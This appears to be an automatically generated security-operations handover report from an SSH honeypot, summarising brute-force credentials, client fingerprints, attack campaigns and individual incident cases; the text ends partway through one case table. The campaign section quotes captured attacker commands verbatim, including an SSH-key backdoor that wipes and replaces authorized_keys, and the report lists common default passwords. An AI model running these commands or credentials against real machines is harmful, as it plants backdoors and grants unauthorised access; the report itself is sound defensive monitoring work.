# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-26 |
| **Generated At** | 2026-07-26T06:41:31Z |
| **Shift Time** | 06:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **236** |
| Confirmed Threats | **223** |
| False Positives Filtered | **13** (5.5%) |
| Unique Attacker IPs | **70** |
| Countries of Origin | **26** |
| High Severity Cases | **117** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **119** |
| Malware Samples Analyzed | **3** HIGH · **32** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **140** |
| Unique Credential Pairs | **96** |
| Unique Usernames | **25** |
| Unique Passwords | **67** |
| Successful Auth Pairs | **128** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 34 |
| `admin` | 22 |
| `support` | 9 |
| `administrator` | 9 |
| `apache` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `0000` | 9 |
| `88888` | 8 |
| `admin` | 6 |
| `techsupport` | 5 |
| `support` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `blank` | `88888` | 6 |
| `pi` | `techsupport` | 5 |
| `support` | `0000` | 5 |
| `support` | `support` | 4 |
| `oracle` | `abc123` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `pi` | `techsupport` | `75.80.65.214` | 2026-07-26T02:56:53 |
| `pi` | `techsupport` | `187.8.120.90` | 2026-07-26T02:57:00 |
| `pi` | `techsupport` | `179.181.133.153` | 2026-07-26T03:00:18 |
| `root` | `` | `94.154.43.92` | 2026-07-26T03:00:33 |
| `pi` | `techsupport` | `10.0.0.73` | 2026-07-26T03:00:45 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.38.205.96` | 2026-07-26T03:01:38 |
| `*1` | `$4` | `34.38.205.96` | 2026-07-26T03:01:52 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 3859` | `34.38.205.96` | 2026-07-26T03:01:54 |
| `support` | `support` | `176.53.159.196` | 2026-07-26T03:02:45 |
| `support` | `support` | `10.0.0.73` | 2026-07-26T03:04:04 |
| `root` | `!root` | `195.178.110.228` | 2026-07-26T03:06:17 |
| `root` | `111111` | `195.178.110.228` | 2026-07-26T03:08:02 |
| `root` | `123123` | `195.178.110.228` | 2026-07-26T03:09:52 |
| `root` | `1234` | `195.178.110.228` | 2026-07-26T03:11:42 |
| `root` | `12345` | `195.178.110.228` | 2026-07-26T03:13:36 |
| `root` | `12345678` | `195.178.110.228` | 2026-07-26T03:17:13 |
| `root` | `123456789` | `195.178.110.228` | 2026-07-26T03:18:59 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-26T03:19:32 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-26T03:19:32 |
| `oracle` | `abc123` | `95.87.248.223` | 2026-07-26T03:19:34 |
| `oracle` | `abc123` | `2.55.125.200` | 2026-07-26T03:19:41 |
| `oracle` | `abc123` | `10.0.0.73` | 2026-07-26T03:20:00 |
| `root` | `P@ssw0rd` | `195.178.110.228` | 2026-07-26T03:20:50 |
| `user` | `3333333` | `27.107.102.154` | 2026-07-26T03:21:20 |
| `user` | `3333333` | `46.101.9.55` | 2026-07-26T03:21:26 |
| `root` | `Password1` | `195.178.110.228` | 2026-07-26T03:22:41 |
| `root` | `Root123` | `195.178.110.228` | 2026-07-26T03:24:32 |
| `user` | `3333333` | `10.0.0.73` | 2026-07-26T03:24:56 |
| `root` | `admin` | `195.178.110.228` | 2026-07-26T03:26:33 |
| `administrator` | `123abc` | `218.26.205.154` | 2026-07-26T03:28:20 |
| `administrator` | `123abc` | `46.201.247.21` | 2026-07-26T03:28:31 |
| `root` | `admin123` | `195.178.110.228` | 2026-07-26T03:28:32 |
| `administrator` | `123abc` | `10.0.0.73` | 2026-07-26T03:28:41 |
| `root` | `alpine` | `195.178.110.228` | 2026-07-26T03:30:28 |
| `root` | `changeme` | `195.178.110.228` | 2026-07-26T03:32:23 |
| `root` | `default` | `195.178.110.228` | 2026-07-26T03:34:12 |
| `root` | `letmein` | `195.178.110.228` | 2026-07-26T03:35:56 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.140.165.23` | 2026-07-26T03:37:28 |
| `*1` | `$4` | `34.140.165.23` | 2026-07-26T03:37:41 |
| `root` | `passw0rd` | `195.178.110.228` | 2026-07-26T03:37:43 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 6525` | `34.140.165.23` | 2026-07-26T03:37:44 |
| `root` | `password` | `195.178.110.228` | 2026-07-26T03:39:21 |
| `blank` | `88888` | `113.11.34.221` | 2026-07-26T03:40:32 |
| `blank` | `88888` | `182.160.114.72` | 2026-07-26T03:40:41 |
| `root` | `qwerty` | `195.178.110.228` | 2026-07-26T03:41:03 |
| `root` | `r00t` | `195.178.110.228` | 2026-07-26T03:42:37 |
| `blank` | `88888` | `96.1.40.151` | 2026-07-26T03:43:41 |
| `blank` | `88888` | `45.181.101.95` | 2026-07-26T03:43:50 |
| `blank` | `88888` | `10.0.0.73` | 2026-07-26T03:44:04 |
| `jordan` | `jordan` | `129.121.123.80` | 2026-07-26T03:44:13 |
| `345gs5662d34` | `345gs5662d34` | `129.121.123.80` | 2026-07-26T03:44:14 |
| `jordan` | `3245gs5662d34` | `129.121.123.80` | 2026-07-26T03:44:15 |
| `yang` | `yang@123` | `57.128.239.181` | 2026-07-26T03:44:23 |
| `345gs5662d34` | `345gs5662d34` | `57.128.239.181` | 2026-07-26T03:44:25 |
| `yang` | `3245gs5662d34` | `57.128.239.181` | 2026-07-26T03:44:26 |
| `root` | `root123` | `195.178.110.228` | 2026-07-26T03:46:07 |
| `root` | `root@123` | `195.178.110.228` | 2026-07-26T03:47:56 |
| `debian` | `000000` | `117.222.2.246` | 2026-07-26T03:48:51 |
| `debian` | `000000` | `223.25.108.2` | 2026-07-26T03:49:03 |
| `root` | `rootme` | `195.178.110.228` | 2026-07-26T03:49:42 |
| `root` | `system` | `195.178.110.228` | 2026-07-26T03:51:15 |
| `root` | `toor` | `195.178.110.228` | 2026-07-26T03:52:43 |
| `root` | `welcome` | `195.178.110.228` | 2026-07-26T03:54:15 |
| `admin` | `111111` | `195.178.110.228` | 2026-07-26T03:55:50 |
| `admin` | `123123` | `195.178.110.228` | 2026-07-26T03:57:26 |
| `admin` | `1234` | `195.178.110.228` | 2026-07-26T03:59:05 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-26T04:00:39 |
| `admin` | `12345` | `195.178.110.228` | 2026-07-26T04:00:46 |
| `admin` | `123456` | `195.178.110.228` | 2026-07-26T04:02:29 |
| `admin` | `12345678` | `195.178.110.228` | 2026-07-26T04:04:12 |
| `debian` | `55` | `196.189.124.229` | 2026-07-26T04:04:48 |
| `admin` | `123456789` | `195.178.110.228` | 2026-07-26T04:05:43 |
| `admin` | `Admin123` | `195.178.110.228` | 2026-07-26T04:07:09 |
| `debian` | `55` | `210.0.90.81` | 2026-07-26T04:08:13 |
| `debian` | `55` | `10.0.0.73` | 2026-07-26T04:08:34 |
| `admin` | `Administrator` | `195.178.110.228` | 2026-07-26T04:08:38 |
| `contentops` | `contentops` | `135.149.57.58` | 2026-07-26T04:08:46 |
| `345gs5662d34` | `345gs5662d34` | `135.149.57.58` | 2026-07-26T04:08:53 |
| `contentops` | `3245gs5662d34` | `135.149.57.58` | 2026-07-26T04:08:55 |
| `price` | `price` | `115.191.38.87` | 2026-07-26T04:09:09 |
| `support` | `0000` | `211.104.166.110` | 2026-07-26T04:09:49 |
| `admin` | `P@ssw0rd` | `195.178.110.228` | 2026-07-26T04:10:12 |
| `admin` | `access` | `195.178.110.228` | 2026-07-26T04:11:47 |
| `support` | `0000` | `107.135.117.245` | 2026-07-26T04:13:11 |
| `support` | `0000` | `117.205.3.26` | 2026-07-26T04:13:24 |
| `admin` | `admin` | `195.178.110.228` | 2026-07-26T04:13:26 |
| `test` | `7` | `218.248.19.102` | 2026-07-26T04:13:41 |
| `support` | `0000` | `10.0.0.73` | 2026-07-26T04:13:42 |
| `admin` | `admin123` | `195.178.110.228` | 2026-07-26T04:15:05 |
| `admin` | `admin@123` | `195.178.110.228` | 2026-07-26T04:16:51 |
| `test` | `7` | `196.189.126.10` | 2026-07-26T04:16:52 |
| `test` | `7` | `121.66.63.186` | 2026-07-26T04:17:03 |
| `test` | `7` | `10.0.0.73` | 2026-07-26T04:17:17 |
| `admin` | `adminadmin` | `195.178.110.228` | 2026-07-26T04:18:40 |
| `admin` | `letmein` | `195.178.110.228` | 2026-07-26T04:20:25 |
| `admin` | `passw0rd` | `195.178.110.228` | 2026-07-26T04:21:55 |
| `admin` | `password` | `195.178.110.228` | 2026-07-26T04:23:24 |
| `admin` | `password1` | `195.178.110.228` | 2026-07-26T04:24:52 |
| `admin` | `qwerty` | `195.178.110.228` | 2026-07-26T04:26:20 |
| `administrator` | `123456` | `195.178.110.228` | 2026-07-26T04:27:49 |
| `guest` | `0000` | `116.114.94.242` | 2026-07-26T04:29:14 |
| `administrator` | `P@ssw0rd` | `195.178.110.228` | 2026-07-26T04:29:21 |
| `guest` | `0000` | `200.159.14.187` | 2026-07-26T04:29:27 |
| `administrator` | `admin` | `195.178.110.228` | 2026-07-26T04:31:05 |
| `administrator` | `administrator` | `195.178.110.228` | 2026-07-26T04:32:48 |
| `guest` | `0000` | `10.0.0.73` | 2026-07-26T04:32:56 |
| `nobody` | `777777` | `213.101.138.172` | 2026-07-26T04:34:10 |
| `administrator` | `password` | `195.178.110.228` | 2026-07-26T04:34:25 |
| `administrator` | `root` | `195.178.110.228` | 2026-07-26T04:36:01 |
| `nobody` | `777777` | `178.178.222.59` | 2026-07-26T04:37:29 |
| `apache` | `1234` | `195.178.110.228` | 2026-07-26T04:37:38 |
| `nobody` | `777777` | `49.124.152.228` | 2026-07-26T04:37:41 |
| `apache` | `12345678` | `195.178.110.228` | 2026-07-26T04:39:07 |
| `apache` | `Apache123` | `195.178.110.228` | 2026-07-26T04:40:38 |
| `root` | `88888` | `10.0.0.73` | 2026-07-26T04:41:47 |
| `apache` | `admin` | `195.178.110.228` | 2026-07-26T04:42:14 |
| `root` | `` | `94.154.43.254` | 2026-07-26T04:43:20 |
| `apache` | `apache` | `195.178.110.228` | 2026-07-26T04:43:55 |
| `apache` | `apache@123` | `195.178.110.228` | 2026-07-26T04:45:34 |
| `apache` | `password` | `195.178.110.228` | 2026-07-26T04:47:13 |
| `backup` | `123` | `195.178.110.228` | 2026-07-26T04:48:58 |
| `backup` | `12345678` | `195.178.110.228` | 2026-07-26T04:50:42 |
| `backup` | `backup` | `195.178.110.228` | 2026-07-26T04:52:18 |
| `config` | `9` | `185.81.94.58` | 2026-07-26T04:53:32 |
| `config` | `9` | `211.253.10.61` | 2026-07-26T04:53:40 |
| `backup` | `backup123` | `195.178.110.228` | 2026-07-26T04:53:58 |
| `POST / HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.92` | 2026-07-26T04:54:41 |
| `POST /_next HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.92` | 2026-07-26T04:54:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **236** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 70 |
| OpenSSH | 30 |
| libssh | 19 |
| Paramiko (Python) | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 65 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 30 | 30 |
| `f555226df196...` | Mirai/variant | 10 | 4 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
| `a2de0f306611...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 65 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 30 | 30 | Mirai/variant |
| `f555226df196...` | libssh | 10 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 9 | 3 | — |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 63 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 2 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.92`, `94.154.43.254`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `135.149.57.58`, `129.121.123.80`, `115.191.38.87`, `57.128.239.181`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **70** |
| Unique ASNs | **49** |
| High-Risk ASNs | **44** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 5 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS9829` | National Internet Backbone | 3 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 2 | HIGH |
| `AS24757` | Ethio Telecom | 2 | HIGH |
| `AS219502` | Storm Industries LLC | 2 | HIGH |
| `AS10429` | TELEFÔNICA BRASIL S.A | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (117)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-28d0ca3aca9f

| Field | Detail |
|---|---|
| **Source IP** | `75.80.65[.]214` |
| **First Seen** | 2026-07-26 02:56 |
| **Last Seen** | 2026-07-26 02:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 02:56:51` | `cowrie.session.connect` |
| `2026-07-26 02:56:51` | `cowrie.client.version` |
| `2026-07-26 02:56:51` | `cowrie.client.kex` |
| `2026-07-26 02:56:53` | `cowrie.login.success` |
| `2026-07-26 02:56:53` | `cowrie.direct-tcpip.request` |
| `2026-07-26 02:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `75.80.65[.]214` to AbuseIPDB if not already reported
- [ ] Block `75.80.65[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53894873f8bd

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-26 02:56 |
| **Last Seen** | 2026-07-26 02:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 02:56:58` | `cowrie.session.connect` |
| `2026-07-26 02:56:59` | `cowrie.client.version` |
| `2026-07-26 02:56:59` | `cowrie.client.kex` |
| `2026-07-26 02:57:00` | `cowrie.login.success` |
| `2026-07-26 02:57:01` | `cowrie.direct-tcpip.request` |
| `2026-07-26 02:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-005c15c75cc0

| Field | Detail |
|---|---|
| **Source IP** | `179.181.133[.]153` |
| **First Seen** | 2026-07-26 03:00 |
| **Last Seen** | 2026-07-26 03:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:00:15` | `cowrie.session.connect` |
| `2026-07-26 03:00:16` | `cowrie.client.version` |
| `2026-07-26 03:00:16` | `cowrie.client.kex` |
| `2026-07-26 03:00:18` | `cowrie.login.success` |
| `2026-07-26 03:00:19` | `cowrie.direct-tcpip.request` |
| `2026-07-26 03:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.181.133[.]153` to AbuseIPDB if not already reported
- [ ] Block `179.181.133[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a82b06205d2

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]92` |
| **First Seen** | 2026-07-26 03:00 |
| **Last Seen** | 2026-07-26 03:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:00:32` | `cowrie.session.connect` |
| `2026-07-26 03:00:33` | `cowrie.login.success` |
| `2026-07-26 03:00:34` | `cowrie.session.params` |
| `2026-07-26 03:00:34` | `cowrie.command.input` |
| `2026-07-26 03:00:35` | `cowrie.command.input` |
| `2026-07-26 03:00:35` | `cowrie.command.input` |
| `2026-07-26 03:00:36` | `cowrie.command.input` |
| `2026-07-26 03:00:36` | `cowrie.command.failed` |
| `2026-07-26 03:00:36` | `cowrie.log.closed` |
| `2026-07-26 03:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]92` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b663126ea103

| Field | Detail |
|---|---|
| **Source IP** | `34.38.205[.]96` |
| **First Seen** | 2026-07-26 03:01 |
| **Last Seen** | 2026-07-26 03:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:01:38` | `cowrie.session.connect` |
| `2026-07-26 03:01:38` | `cowrie.login.success` |
| `2026-07-26 03:01:39` | `cowrie.session.params` |
| `2026-07-26 03:01:39` | `cowrie.command.input` |
| `2026-07-26 03:01:39` | `cowrie.command.input` |
| `2026-07-26 03:01:39` | `cowrie.command.failed` |
| `2026-07-26 03:01:39` | `cowrie.command.input` |
| `2026-07-26 03:01:39` | `cowrie.log.closed` |
| `2026-07-26 03:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.205[.]96` to AbuseIPDB if not already reported
- [ ] Block `34.38.205[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cbdbe3537cf

| Field | Detail |
|---|---|
| **Source IP** | `34.38.205[.]96` |
| **First Seen** | 2026-07-26 03:01 |
| **Last Seen** | 2026-07-26 03:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:01:52` | `cowrie.session.connect` |
| `2026-07-26 03:01:52` | `cowrie.login.success` |
| `2026-07-26 03:01:52` | `cowrie.session.params` |
| `2026-07-26 03:01:52` | `cowrie.command.input` |
| `2026-07-26 03:01:52` | `cowrie.command.failed` |
| `2026-07-26 03:01:59` | `cowrie.log.closed` |
| `2026-07-26 03:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.205[.]96` to AbuseIPDB if not already reported
- [ ] Block `34.38.205[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d85bc2ae9599

| Field | Detail |
|---|---|
| **Source IP** | `34.38.205[.]96` |
| **First Seen** | 2026-07-26 03:01 |
| **Last Seen** | 2026-07-26 03:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:01:54` | `cowrie.session.connect` |
| `2026-07-26 03:01:54` | `cowrie.login.success` |
| `2026-07-26 03:01:54` | `cowrie.session.params` |
| `2026-07-26 03:01:54` | `cowrie.command.input` |
| `2026-07-26 03:01:59` | `cowrie.log.closed` |
| `2026-07-26 03:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.205[.]96` to AbuseIPDB if not already reported
- [ ] Block `34.38.205[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07a6b90a414d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 03:02 |
| **Last Seen** | 2026-07-26 03:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:02:44` | `cowrie.session.connect` |
| `2026-07-26 03:02:44` | `cowrie.client.version` |
| `2026-07-26 03:02:44` | `cowrie.client.kex` |
| `2026-07-26 03:02:45` | `cowrie.login.success` |
| `2026-07-26 03:02:45` | `cowrie.direct-tcpip.request` |
| `2026-07-26 03:02:45` | `cowrie.direct-tcpip.data` |
| `2026-07-26 03:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98369e524992

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:06 |
| **Last Seen** | 2026-07-26 03:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:06:14` | `cowrie.session.connect` |
| `2026-07-26 03:06:15` | `cowrie.client.version` |
| `2026-07-26 03:06:15` | `cowrie.client.kex` |
| `2026-07-26 03:06:17` | `cowrie.login.success` |
| `2026-07-26 03:06:18` | `cowrie.session.params` |
| `2026-07-26 03:06:18` | `cowrie.command.input` |
| `2026-07-26 03:06:18` | `cowrie.command.input` |
| `2026-07-26 03:06:18` | `cowrie.command.input` |
| `2026-07-26 03:06:18` | `cowrie.command.input` |
| `2026-07-26 03:06:18` | `cowrie.command.input` |
| `2026-07-26 03:06:18` | `cowrie.command.success` |
| `2026-07-26 03:06:18` | `cowrie.command.input` |
| `2026-07-26 03:06:18` | `cowrie.command.input` |
| `2026-07-26 03:06:18` | `cowrie.command.input` |
| `2026-07-26 03:06:18` | `cowrie.command.input` |
| `2026-07-26 03:06:18` | `cowrie.log.closed` |
| `2026-07-26 03:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71097b29e7a8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:07 |
| **Last Seen** | 2026-07-26 03:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
